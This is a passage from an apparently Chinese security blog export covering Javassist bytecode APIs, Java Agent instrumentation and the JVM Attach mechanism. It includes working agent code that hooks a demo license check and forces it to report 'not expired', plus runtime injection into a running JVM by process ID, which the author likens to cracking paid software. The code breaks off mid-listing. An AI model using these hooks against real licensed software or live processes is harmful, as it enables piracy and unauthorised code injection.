这段代码产生以下序列的代码属性： 12iconst_3ireturn 还可以通过调用 Bytecode 中的 get() 方法来获取包含此序列的字节数组。获得的数组可以插入另一个代码属性中。 Bytecode 提供了许多方法来添加特定的指令，例如使用 addOpcode() 添加一个 8 位操作码，使用 addIndex() 用于添加一个索引。每个操作码的值定义在 Opcode 接口中。 addOpcode() 和添加特定指令的方法，会自动维持最大堆栈深度，除非控制流没有分支。最大堆栈深度这个值可以通过调用 Bytecode 的 getMaxStack() 方法来获得。它也反映在从 Bytecode对象构造的 CodeAttribute 对象上。要重新计算方法体的最大堆栈深度，可以调用 CodeAttribute 的 computeMaxStack() 方法。 可以使用Bytecode来构造一个方法。例如： 12345678910ClassFile cf = ...Bytecode code = new Bytecode(cf.getConstPool());code.addAload(0);code.addInvokespecial(\"java/lang/Object\", MethodInfo.nameInit, \"()V\");code.addReturn(null);code.setMaxLocals(1);MethodInfo minfo = new MethodInfo(cf.getConstPool(), MethodInfo.nameInit, \"()V\");minfo.setCodeAttribute(code.toCodeAttribute());cf.addMethod(minfo); 这段代码制作了默认的构造函数，并将其添加到cf指定的类中，Bytecode对象首先被转换为CodeAttribute对象，然后添加到minfo指定的方法中。最后将该方法添加到类文件cf中。 注解 元标签注释作为运行时不可见（或可见）的注记属性，存储在类文件中。 调用 getAttribute（AnnotationsAttribute.invisibleTag）方法，可以从 ClassFile，MethodInfo 或 FieldInfo 中获取注记属性。 更多信息，请参阅 javassist.bytecode.AnnotationsAttribute 和javassist.bytecode.annotation 包的 javadoc 手册。 Javassist还允许你通过更高级别的API访问注解。如果你想通过CtClass访问注解，在CtClass或CtBehavior中调用getAnnotations()。 泛型Javassist 的低级别 API 完全支持 Java 5 引入的泛型。但是，高级别的API（如CtClass）不直接支持泛型。 Java的泛型是通过擦除技术实现的。在编译之后，所有的类型参数都会被丢掉。例如，假设你的源代码声明了一个参数化类型Vector 。 123Vector&lt;String&gt; v = new Vector&lt;String&gt;(); :String s = v.get(0); 编译后的字节码等价于以下代码： 123Vector v = new Vector(); :String s = (String)v.get(0); 所以当你写字节码变换器时，你可以直接放弃所有类型参数。 由于Javassist中嵌入的编译器不支持泛型，所以如果源代码是由Javassist编译的，例如通过CtMethod.make()，必须在调用者处插入一个显式类型转换。如果源代码是由普通的Java编译器（如javac）编译的，则无需进行类型转换。 例如，如果你有一个类： 1234public class Wrapper&lt;T&gt; &#123; T value; public Wrapper(T t) &#123; value = t; &#125;&#125; 并想添加一个接口 Getter 到类 Wrapper： 123public interface Getter&lt;T&gt; &#123; T get();&#125; 那么你真正要添加的接口其实是Getter（将类型参数丢掉），最后你添加到 Wrapper 类的方法是这样的： 1public Object get() &#123; return value; &#125; 注意，不需要类型参数。 由于 get 返回一个 Object，如果源代码是由 Javassist 编译的，那么在调用方需要进行显式类型转换。 例如，如果类型参数 T 是 String，则必须插入（String），如下所示： 12Wrapper w = ...String s = (String)w.get(); 如果你需要在运行时通过反射使类型参数可以访问，你必须在类文件中添加通用签名。更多的细节，请参见CtClass中setGenericSignature方法的API文档（javadoc）。 可变参数目前，Javassist 不直接支持可变参数。 因此，要使用 varargs 创建方法，必须显式设置方法修饰符。假设要定义下面这个方法： 1public int length(int... args) &#123; return args.length; &#125; 使用 Javassist 应该是这样的： 1234CtClass cc = /* target class */;CtMethod m = CtMethod.make(\"public int length(int[] args) &#123; return args.length; &#125;\", cc);m.setModifiers(m.getModifiers() | Modifier.VARARGS);cc.addMethod(m); 参数类型int ...被更改为int []，Modifier.VARARGS被添加到方法修饰符中。 要在由 Javassist 的编译器编译的源代码中调用此方法，需要这样写： 1length(new int[] &#123; 1, 2, 3 &#125;); 而不是这样： 1length(1, 2, 3);","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Javassist","slug":"Javassist","permalink":"https://0range228.github.io/tags/Javassist/"}]},{"title":"Java Agent解读","slug":"Java-Agent解读","date":"2021-02-01T13:37:00.000Z","updated":"2021-02-10T15:06:45.207Z","comments":true,"path":"Java-Agent解读/","link":"","permalink":"https://0range228.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/","excerpt":"序言 空山新雨后，天色晚来秋。 整理Java Agent相关知识 。","text":"序言 空山新雨后，天色晚来秋。 整理Java Agent相关知识 。 概念Java AgentJava Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载。 JVMTI==万物起源== JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。 Instrumentation在Java SE 5之前，要实现一个Agent只能通过编写Native代码来实现。 从Java SE 5开始，可以使用Java的Instrumentation接口（java.lang.instrument包）来编写Agent。 从而 Java SE 6 的新特性改变了这种情况，通过 Java Tool API 中的 attach 方式，我们可以很方便地在运行过程中动态地设置加载代理类，以达到Instrumentation的目的。 并且从Java SE 6开始，可以向native method插桩。 ==无论是通过Native的方式还是通过Java Instrumentation接口的方式来编写Agent，它们的工作都是借助JVMTI来进行完成。== Instrumentation这里把Instrumentation单独拿出来细说java.lang.instrument.Instrumentation. Instrumentation接口设计初衷是为了收集Java程序运行时的数据，用于监控运行程序状态，记录日志，分析代码用的。 目前可以实现(对应JVM方法)： 动态添加或移除自定义的ClassFileTransformer（addTransformer/removeTransformer） JVM会在类加载时调用Agent中注册的ClassFileTransformer； 动态修改classpath（appendToBootstrapClassLoaderSearch、appendToSystemClassLoaderSearch） 将Agent程序添加到BootstrapClassLoader和SystemClassLoaderSearch（对应的是ClassLoader类的getSystemClassLoader方法，默认是sun.misc.Launcher$AppClassLoader）中搜索； 动态获取所有JVM已加载的类(getAllLoadedClasses)； 动态获取某个类加载器已实例化的所有类(getInitiatedClasses)。 重定义某个已加载的类的字节码(redefineClasses)。 动态设置JNI前缀(setNativeMethodPrefix)，可以实现Hook native方法。 重新加载某个已经被JVM加载过的类字节码(retransformClasses)。 两种部署模式： Java Agent支持目标JVM启动时加载，也支持在目标JVM运行时加载，这两种不同的加载模式会使用不同的入口函数。 Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了main方法为程序入口，而Java Agent则将premain（Agent模式）和agentmain（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的。 Instrumentation类方法如下： 学习API最好的方法就是阅读JavaDoc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package java.lang.instrument; 该类提供了工具化Java编程语言代码所需的服务。 仪表化是指在方法中添加字节码，以收集数据，供工具使用。 由于这些变化是纯粹的加法，所以这些工具不会修改应用程序的状态或行为。 这种良性工具的例子包括监控代理、剖析器、覆盖率分析器和事件记录器。 下面有两种方式来实例化Instrumentation接口： 1.当JVM启动时，-javaagent：Agent.jar 指示代理类。在这种情况下，premain方法会接收一个Instrumentation实例作为入参。 2.当JVM启动之后，可以Attach目标进程上。在这种情况下，agentmain方法会接收一个Instrumentation实例作为入参。 一旦Agent获得一个Instrumentation实例，代理可以在任何时候调用实例上的方法。 void addTransformer(ClassFileTransformer transformer,boolean canRetransform) 注册所提供的Tranformer。从此以后所有类定义都会被Tranformer看到，但不包括任何已注册的Transformer所依赖的类的定义。 当类被加载时，当类被重新定义时，Tranformer被调用； 如果 canRetransform 为真，当类被重新转换时，变压器被调用。 变换调用的顺序请参见 ClassFileTransformer.transformer。 如果一个Transformer在执行过程中抛出了异常，JVM仍然会依次调用其他注册的Transformer。 同一个Transformer可以被添加一次以上，但强烈不鼓励这样做，可以通过创建一个新的Transformer实例来避免这种情况。boolean removeTransformer(ClassFileTransformer transformer) 解除所提供的Transformer注册。今后的类定义将不会显示给Transformer。 删除Transformer最近添加的匹配实例。由于类加载的多线程特性，Transformer在被删除后可能会收到调用。 Transformer的编写应考虑到这种情况。boolean isRetransformClassesSupported() 返回当前JVM配置是否支持类的重新转换。 重构已经加载的类的能力是JVM的一个可选能力，只有当代理JAR中的Can-Retransform-Classes manifest属性被设置为true时，才支持重构。 只有在代理 JAR 文件中 Can-Retransform-Classes manifest 属性被设置为 true（如包规范中所述）且 JVM 支持此能力时，才会支持重构。 在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException 给Class&lt;?&gt; classes 中的若干类进行转换。 该方法便于对已经加载的类进行转换。 当类被初始加载或重新定义时，可以使用ClassFileTransformer对初始类文件字节进行转换。 这个函数会重新运行转换过程（无论之前是否发生过转换）。 重新转换遵循以下步骤： 1. 从初始的类文件字节开始 2. 对于每个添加了 canRetransform false 的Transformer，由 transform 返回的字节将被重新使用，作为变换的输出，不做任何修改； 3. 对于每个添加了 canRetransform true 的Transformer，这些Transformer都会调用 transform 方法。 4.转化后的类文件字节被安装为类的新定义。 变换的顺序在 transform 方法中描述。这个相同的顺序被用于自动重新应用无法变换的变换。 初始类文件的字节代表传递给ClassLoader.defineClass或redefineClasses的字节（在任何转换行为之前），然而它们可能不完全匹配。常量池可能没有相同的布局或内容。常量池可能有更多或更少的条目。常量池条目的顺序可能不同，但是，方法字节码中的常量池索引会对应。一些属性可能不存在。在顺序没有意义的地方，例如方法的顺序，顺序可能不会被保留。 该方法会在一个集合上操作（看入参的形式就是一个不定数组），以允许同时对多个类进行相互依赖的改变（类 A 的重构可能需要类 B 的重构）。 如果一个重构的方法有高频活动的栈帧，这些活动帧将继续运行原方法的字节码。重构后的方法将在新的调用.invoke()中使用。 这个方法不会引起任何初始化.换句话说，重新定义一个类不会导致其初始化。静态变量的值将保持在调用之前的状态。 重构后的类的实例不会受到影响。 重构可以改变方法体、常量池和类属性。重构不能增加、删除或重命名字段或方法，不能改变方法的签名，也不能改变继承。这些限制也许会在未来的版本中被取消。类文件字节的检查、验证和安装直到应用了转换之后才会进行，如果结果字节有错误，这个方法将抛出一个异常。 如果本方法抛出异常，说明没有类被重新转换。 boolean isRedefineClassesSupported() 返回当前JVM配置是否支持类的重新定义。 重新定义已经加载的类的能力是JVM的一个可选能力，只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为true时，才会支持重新定义。 只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为true时，才会支持重新定义（如包规范中所述），并且JVM支持该能力。在单个JVM的单次实例化过程中，对该方法的多次调用将始终返回相同的答案。 void redefineClasses(ClassDefinition... definitions) throws ClassNotFoundException, UnmodifiableClassException 使用提供的类文件重新定义提供的类集。 这个方法用于替换类的定义，而不引用现有的类文件字节。 就像从源码重新编译以进行修复和继续调试时一样。当现有的类文件字节要被转换时（例如在字节码instrumentation中），应该使用retransformClasses。 这个方法在一个集合上操作，以便允许同时对多个类进行相互依赖的改变（对类A的重新定义可能需要对类B的重新定义）。 boolean isModifiableClass(Class&lt;?&gt; theClass) 确定一个类是否可以通过retransformClasses或redefineClasses进行修改。如果一个类是可修改的，那么本方法返回true。如果一个类是不可修改的，那么这个方法返回false。 要想对一个类进行重构，isRetransformClassesSupported()也必须为真。但是is的值不会影响这个函数返回的值。要想重新定义一个类，isRedefineClassesSupported()也必须为真，但isRedefineClassesSupported()的值不会影响这个函数返回的值。 基元类（例如java.lang.Integer.TYPE）和数组类是永远不能修改的。 Class[] getAllLoadedClasses() 返回JVM当前加载的所有类的数组。 Class[] getInitiatedClasses(ClassLoader loader) 返回一个数组，该数组包含了所有由loader加载的类。如果提供的Loader为空，则返回由bootstrap类Loader加载的类。 long getObjectSize(Object objectToSize) 返回指定对象消耗的存储量的近似值。这个结果可能包括对象的部分或全部开销，因此对于在单独一个实现内进行比较是有用的，但对于实现之间的比较是没有用的。在JVM的单次调用中，估计值可能会改变。 void appendToBootstrapClassLoaderSearch(JarFile jarfile) 指定一个JAR文件（包含插桩类），让它由Bootstrap加载器加载。 当虚拟机内置的类加载器（称为 \"bootstrap class loader\"）搜索某个类不成功时，JAR文件中的条目也会被搜索。 本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。 Agent应该注意确保JAR文件中除了那些将由引导类加载器定义的类或资源，不包含任何其他类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为。例如，假设有一个加载器L，L的用于授权的父类是bootstrap类加载器。此外，L定义的类C中的一个方法引用了一个非公共的访问者类C$1，如果JAR文件中包含一个类C$1，那么授权给bootstrap类加载器将导致C$1被bootstrap类加载器定义。在这个例子中，一个IllegalAccessError将被抛出，可能会导致应用程序失败。避免这类问题的一个方法是为插桩类使用一个独特的包名。 void appendToSystemClassLoaderSearch(JarFile jarfile) 指定一个JAR文件（包含插桩类），让它由SystemClassLoader。 这里面的SystemClassLoader其实就是ApplicationClassLoader。 当委托的系统类加载器（参见getSystemClassLoader()）搜索一个类不成功时，JarFile中的条目将被搜索。本方法可以多次使用，按照本方法被调用的顺序添加多个JAR文件进行搜索。 Agent应注意确保JAR中不包含除SystemClassLoader以外的任何类或资源。如果不遵守这个警告，可能会导致难以诊断的意外行为（参见appendToBootstrapClassLoaderSearch）。 如果SystemClassLoader实现了一个名为appendToClassPathForInstrumentation的方法，那么它就支持添加一个要搜索的JAR文件，该方法接收一个类型为java.lang.String的单一参数。该方法不需要公开访问。JAR文件的名称是通过调用jarfile上的getName()方法获得的，并作为参数提供给appendToClassPathForInstrumentation方法。 此方法不会改变java.class.path系统属性的值。boolean isNativeMethodPrefixSupported() 返回当前JVM配置是否支持设置本地方法前缀。设置本地方法前缀的能力是JVM的一个可选能力。 只有在代理 JAR 文件中 Can-Set-Native-Method-Prefix manifest 属性被设置为 true（如包规范中所述）且 JVM 支持该能力时，才会支持设置本地方法前缀。 在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。void setNativeMethodPrefix(ClassFileTransformer transformer,String prefix) 设置native method 前缀 ClassFileTransformerjava.lang.instrument.ClassFileTransformer是一个转换类文件的代理接口，我们可以在获取到Instrumentation对象后通过addTransformer方法添加自定义类文件转换器。 可以使用addTransformer注册一个我们自定义的Transformer到Java Agent，当有新的类被JVM加载时JVM会自动回调用我们自定义的Transformer类的transform方法，传入该类的transform信息(类名、类加载器、类字节码等)，==可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后将新的类字节码返回给JVM==，JVM会验证类和相应的修改是否合法，如果符合类加载要求JVM会加载我们修改后的类字节码。 继续读JavaDoc： 12345678910111213141516171819202122232425262728通常，一个Agent提供了这个接口的实现，以便转换类文件。转换发生在JVM定义类之前。请注意，类文件这个术语在Java™虚拟机规范第3.1节中定义，指的是类文件格式的字节序列，无论它们是否驻留在文件中。 byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException 该方法的实现可以对提供的类文件进行转换，并返回一个新的替换类文件。 一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。能够重构的变换器也会在每次类重构时被调用。 新类定义的请求是通过ClassLoader.defineClass或其原生等价物来实现的。 对类的redefinition的请求是通过Instrumentation.redefineClasses或它的本机等价物提出的。 类的retransformation请求由 Instrumentation.retransformClasses 或其本机等价物发出。 在请求的处理过程中，在类文件字节被验证或应用之前，Transformer被调用。 当有多个Transformer时，Transformer是通过链式变换调用组成的。也就是说，一次变换调用返回的字节数组成为下一次调用的输入（通过classfileBuffer参数）。 对于retransformation，不能重构的变换器不被调用，而是重用之前变换的结果。在所有其他情况下，这个方法都会被调用。在这些分组中，transformers按照注册的顺序被调用。原生变换器由Java虚拟机工具接口中的ClassFileLoadHook事件提供。 参数： loader 定义要转换的类加载器；如果是引导加载器，则为 null className 类名,如:java/lang/Runtime classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null protectionDomain 要定义或重定义的类的保护域 classfileBuffer 类文件格式的输入字节缓冲区（不得修改） return 字节码byte数组 重写transform方法需要注意以下事项： ClassLoader如果是被Bootstrap ClassLoader(引导类加载器)所加载那么loader参数的值是空。 修改类字节码时需要特别注意插入的代码在对应的ClassLoader中可以正确的获取到，否则会报ClassNotFoundException，比如修改java.io.FileInputStream(该类由Bootstrap ClassLoader加载)时插入了我们检测代码，那么我们将必须保证FileInputStream能够获取到我们的检测代码类。 JVM类名的书写方式路径方式：java/lang/String 而不是我们常用的类名方式：java.lang.String。 类字节必须符合JVM校验要求，如果无法验证类字节码会导致JVM崩溃或者VerifyError(类验证错误)。 如果修改的是retransform类(修改已被JVM加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。 addTransformer时如果没有传入retransform参数(默认是false)就算MANIFEST.MF中配置了Can-Redefine-Classes: true而且手动调用了retransformClasses方法也一样无法retransform。一定要增加true参数！！！ 卸载transform时需要使用创建时的Instrumentation实例。 Java Agent还限制了我们： 必须以jar包的形式运行或加载； 必须包含/META-INF/MANIFEST.MF文件，且该文件中必须定义好Premain-Class（启动前Agent模式）或Agent-Class:（运行中Agent模式）配置； 如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在MANIFEST.MF中添加Can-Retransform-Classes: true或Can-Redefine-Classes: true。 实验部分接下来进行实验，启动前premain+-javaagent以及启动中Attach 两种模式。 启动前指定Agent位置如果需要在目标JVM启动的同时加载Agent，实现： 12[1] public static void premain(String agentArgs, Instrumentation inst);[2] public static void premain(String agentArgs); JVM将首先寻找[1]，如果没有发现[1]，再寻找[2]。 实战一：premain方法测试写一个demo做个实验： 创建Agent类，声明premain方法： 使用maven-jar-plugin，创建MANIFEST.MF： MANIFEST.MF： mvn clean install生成jar包：java_agent_01-1.0-SNAPSHOT 待插桩类： 同样打包，example01-1.0-SNAPSHOT： 终端执行，成功插桩： 实战二：打印加载的类之前也提到，一旦你addTransformer之后，需要加载的每一个类都会经过transform方法。 一旦用addTransformer注册了一个Transformer，那么每一个新的类定义和每一个类的重新定义都会调用这个变换器。 首先addTranformer： 这里ClassFileTransformerDemo()继承了ClassFileTransformer类，记得最后加上ture： 这里就是简单的执行了打印在Tranformer之后加载的类： 实战三：代码插桩这里复现一下yz的实验。这个例子写得很好，类似于破解官方软件的一种绕过过程，毕竟白嫖才是最香的。 首先这里有一个校验函数用来判断用户是否已经过了有效期，这个截止日期是硬编码在代码中的，由于是写死的那么就会一直提示已经过期： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class CheckLicense &#123; private static final SimpleDateFormat DATE_FORMAT = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); private static boolean checkExpiry(String expireDate) throws ParseException &#123; try &#123; Date date = DATE_FORMAT.parse(expireDate); // 检测当前系统时间早于License授权截至时间 if (new Date().before(date)) &#123; return false; &#125; &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; return true; &#125; public static void main(String[] args) &#123; // 设置一个已经过期的License时间 final String expireDate = \"2020-10-01 00:00:00\"; new Thread(new Runnable() &#123; @Override public void run() &#123; while (true) &#123; try &#123; String time = \"[\" + DATE_FORMAT.format(new Date()) + \"] \"; // 检测license是否已经过期 try &#123; if (checkExpiry(expireDate)) &#123; System.err.println(time + \"您的授权已过期，请重新购买授权！\"); &#125; else &#123; System.out.println(time + \"您的授权正常，截止时间为：\" + expireDate); &#125; &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; // sleep 1秒 TimeUnit.SECONDS.sleep(1); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;).start(); &#125;&#125; 硬编码有效期是一个已经过期的License时间final String expireDate = &quot;2020-10-01 00:00:00&quot;; 已经过期： 这里开始编写Agent： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class ClassFileTransformerDemo implements ClassFileTransformer &#123; /** * 需要被Hook的类 */ private static final String HOOK_CLASS = \"com.sec.CheckLicense\"; @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; // 将目录路径替换成Java类名 String cn = className.replace(\"/\", \".\"); // 只处理HOOK_CLASS类的字节码 if (cn.equals(HOOK_CLASS)) &#123; System.out.println(cn); try &#123; ClassPool classPool = ClassPool.getDefault(); // 使用javassist将类二进制解析成CtClass对象 CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); // 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx) CtMethod ctMethod = ctClass.getDeclaredMethod( \"checkExpiry\", new CtClass[]&#123;classPool.getCtClass(\"java.lang.String\")&#125; ); // 在checkExpiry方法执行前插入输出License到期时间代码 ctMethod.insertBefore(\"System.out.println(\\\"License到期时间：\\\" + $1);\"); // 修改checkExpiry方法的返回值，将授权过期改为未过期 ctMethod.insertAfter(\"return false;\"); // 修改后的类字节码 return ctClass.toBytecode(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return classfileBuffer; &#125;&#125; 这里相当于将检测日期函数写死return false。 打包，运行： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;filters&gt; &lt;filter&gt; &lt;artifact&gt;*:*&lt;/artifact&gt; &lt;excludes&gt; &lt;exclude&gt;MANIFEST.MF&lt;/exclude&gt; &lt;exclude&gt;META-INF/DEPENDENCIES&lt;/exclude&gt; &lt;exclude&gt;META-INF/LICENSE*&lt;/exclude&gt; &lt;exclude&gt;META-INF/NOTICE*&lt;/exclude&gt; &lt;/excludes&gt; &lt;/filter&gt; &lt;/filters&gt; &lt;artifactSet&gt; &lt;includes&gt; &lt;include&gt;org.javassist:javassist:jar:*&lt;/include&gt; &lt;/includes&gt; &lt;/artifactSet&gt; &lt;!-- 修改第三方依赖包名称 --&gt; &lt;relocations&gt; &lt;relocation&gt; &lt;pattern&gt;javassist&lt;/pattern&gt; &lt;shadedPattern&gt;com.fxc.deps.javassist&lt;/shadedPattern&gt; &lt;/relocation&gt; &lt;/relocations&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; 启动中进行Agent Attach之前的permain方法只能在java程序启动之前执行，而Java SE 6的新特性改变了这种情况，可以通过Java Tool API中的attach方式来达到这种程序启动之后设置代理的效果。 下面来分析一下动态加载Agent的相关技术细节。 AttachListenerAttach机制通过Attach Listener线程来进行相关事务的处理，下面来看一下Attach Listener线程是如何初始化的。 1234567891011// Starts the Attach Listener thread//创建AttachListener线程void AttachListener::init() &#123; // 创建线程相关部分代码被去掉了 const char thread_name[] = \"Attach Listener\"; Handle string = java_lang_String::create_from_str(thread_name, THREAD); &#123; MutexLocker mu(Threads_lock); JavaThread* listener_thread = new JavaThread(&amp;attach_listener_thread_entry); // ... &#125;&#125; 一个线程启动之后都需要指定一个入口来执行代码，Attach Listener线程的入口是attach_listener_thread_entry，下面看一下这个函数的具体实现： 下面看attach_listener_thread_entry的具体实现： 1234567891011121314151617static void attach_listener_thread_entry(JavaThread* thread, TRAPS) &#123; AttachListener::set_initialized(); for (;;) &#123; //拉取一个需要执行的任务 AttachOperation* op = AttachListener::dequeue(); // find the function to dispatch too AttachOperationFunctionInfo* info = NULL; for (int i=0; funcs[i].name != NULL; i++) &#123; const char* name = funcs[i].name; if (strcmp(op-&gt;name(), name) == 0) &#123; info = &amp;(funcs[i]); break; &#125;&#125; // dispatch to the function that implements this operation res = (info-&gt;func)(op, &amp;st); //... &#125;&#125; 整个函数执行逻辑，大概是这样的： 拉取一个需要执行的任务：AttachListener::dequeue。 查询匹配的命令处理函数。 执行匹配到的命令执行函数。 其中第二步里面存在一个命令函数表，整个表如下： 12345678910111213static AttachOperationFunctionInfo funcs[] = &#123; &#123; \"agentProperties\", get_agent_properties &#125;, &#123; \"datadump\", data_dump &#125;, &#123; \"dumpheap\", dump_heap &#125;, &#123; \"load\", load_agent &#125;, &#123; \"properties\", get_system_properties &#125;, &#123; \"threaddump\", thread_dump &#125;, &#123; \"inspectheap\", heap_inspection &#125;, &#123; \"setflag\", set_flag &#125;, &#123; \"printflag\", print_flag &#125;, &#123; \"jcmd\", jcmd &#125;, &#123; NULL, NULL &#125;&#125;; 对于加载Agent来说，命令就是“load”。 任务从哪来，这个秘密就藏在AttachListener::dequeue这行代码里面，接下来来分析一下dequeue这个函数： 12345678910111213141516171819LinuxAttachOperation* LinuxAttachListener::dequeue() &#123; for (;;) &#123; // wait for client to connect struct sockaddr addr; socklen_t len = sizeof(addr); RESTARTABLE(::accept(listener(), &amp;addr, &amp;len), s); // get the credentials of the peer and check the effective uid/guid // - check with jeff on this. struct ucred cred_info; socklen_t optlen = sizeof(cred_info); if (::getsockopt(s, SOL_SOCKET, SO_PEERCRED, (void*)&amp;cred_info, &amp;optlen) == -1) &#123; ::close(s); continue; &#125; // peer credential look okay so we read the request LinuxAttachOperation* op = read_request(s); return op; &#125;&#125; 上面的代码表明，Attach Listener在某个端口监听着，通过accept来接收一个连接，然后从这个连接里面将请求读取出来，然后将请求包装成一个AttachOperation类型的对象，之后就会从表里查询对应的处理函数，然后进行处理。 Attach Listener使用一种被称为“懒加载”的策略进行初始化，也就是说，JVM启动的时候Attach Listener并不一定会启动起来。 具体实现运行时Attach方法里面的关键是调用VirtualMachine的attach方法进行Agent挂载的功能。 下面分析一下VirtualMachine的attach方法具体是怎么实现的。 Attach模式需要知道我们运行的Java程序进程ID，通过Java虚拟机的进程注入方式实现可以将我们的Agent程序动态的注入到一个已在运行中的Java程序中。 还是之前那个例子，可以使用jps -l命令进行查看： Java代码实现可以使用com.sun.tools.attach.VirtualMachine的list方法即可获取本机所有运行的Java进程，如： 有了进程ID我们就可以使用Attach API注入Agent了，Attach Java进程注入通用示例代码如下： 123456789101112// Java进程IDString pid = args[0];// 设置Agent文件的绝对路径String agentPath = \"/xxx/agent.jar\";// 注入到JVM虚拟机进程VirtualMachine vm = VirtualMachine.attach(pid);// 注入Agent到目标JVMvm.loadAgent(agentPath);vm.detach(); 使用Attach模式启动Agent程序时需要使用到JDK目录下的lib/tools.jar，如果没有配置CLASS_PATH环境变量的话需要在运行Agent程序时添加-Xbootclasspath/a:$JAVA_HOME/lib/tools.jar参数，否则无法使用Attach API。 1java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -jar AgentAttach-1.0-SNAPSHOT.jar 首先后台运行监测代码，用我们的jar包获取目标进程：16281 接下来直接注入就完事了： 1java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -classpath $JAVA_HOME/lib/tools.jar:AgentAttach-1.0-SNAPSHOT.jar -jar AgentAttach-1.0-SNAPSHOT.jar 16281 成功修改： 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119public class AttachAgent &#123; /** * 需要被Hook的类 */ private static final String HOOK_CLASS = \"com.sec.CheckLicense\"; public static void main(String[] args) &#123; if (args.length == 0) &#123; List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list(); for (VirtualMachineDescriptor desc : list) &#123; System.out.println(\"进程ID：\" + desc.id() + \"，进程名称：\" + desc.displayName()); &#125; &#125; // Java进程ID String pid = args[0]; try &#123; // 注入到JVM虚拟机进程 VirtualMachine vm = VirtualMachine.attach(pid); // 获取当前Agent的jar包路径 URL agentURL = AttachAgent.class.getProtectionDomain().getCodeSource().getLocation(); String agentPath = new File(agentURL.toURI()).getAbsolutePath(); // 注入Agent到目标JVM vm.loadAgent(agentPath); vm.detach(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void agentmain(String args, final Instrumentation inst) &#123; loadAgent(args, inst); &#125; private static void loadAgent(String arg, final Instrumentation inst) &#123; // 创建ClassFileTransformer对象 ClassFileTransformer classFileTransformer = createClassFileTransformer(); // 添加自定义的Transformer，第二个参数true表示是否允许Agent Retransform， // 需配合MANIFEST.MF中的Can-Retransform-Classes: true配置 inst.addTransformer(classFileTransformer, true); // 获取所有已经被JVM加载的类对象 Class[] loadedClass = inst.getAllLoadedClasses(); for (Class clazz : loadedClass) &#123; String className = clazz.getName(); if (inst.isModifiableClass(clazz)) &#123; // 使用Agent重新加载HelloWorld类的字节码 if (className.equals(HOOK_CLASS)) &#123; try &#123; inst.retransformClasses(clazz); &#125; catch (UnmodifiableClassException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; private static ClassFileTransformer createClassFileTransformer() &#123; return new ClassFileTransformer() &#123; /** * 类文件转换方法，重写transform方法可获取到待加载的类相关信息 * * @param loader 定义要转换的类加载器；如果是引导加载器，则为 null * @param className 类名,如:java/lang/Runtime * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null * @param protectionDomain 要定义或重定义的类的保护域 * @param classfileBuffer 类文件格式的输入字节缓冲区（不得修改） * @return 字节码byte数组。 */ @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) &#123; // 将目录路径替换成Java类名 className = className.replace(\"/\", \".\"); // 只处理HOOK_CLASS类的字节码 if (className.equals(HOOK_CLASS)) &#123; try &#123; ClassPool classPool = ClassPool.getDefault(); // 使用javassist将类二进制解析成CtClass对象 CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); // 